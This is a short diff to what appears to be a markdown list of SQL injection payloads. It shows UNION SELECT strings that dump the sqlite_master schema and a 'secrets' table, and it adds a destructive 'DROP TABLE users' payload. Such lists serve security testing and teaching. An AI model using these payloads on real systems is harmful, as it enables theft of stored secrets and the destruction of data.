@@ -25,3 +25,7 @@ erik' UNION SELECT name, sql FROM sqlite_master --
 ' UNION SELECT name, sql, 1 FROM sqlite_master --
 ' UNION SELECT id, key, value FROM secrets --
 ```
+Destructive
+```
+'; DROP TABLE users --
+```
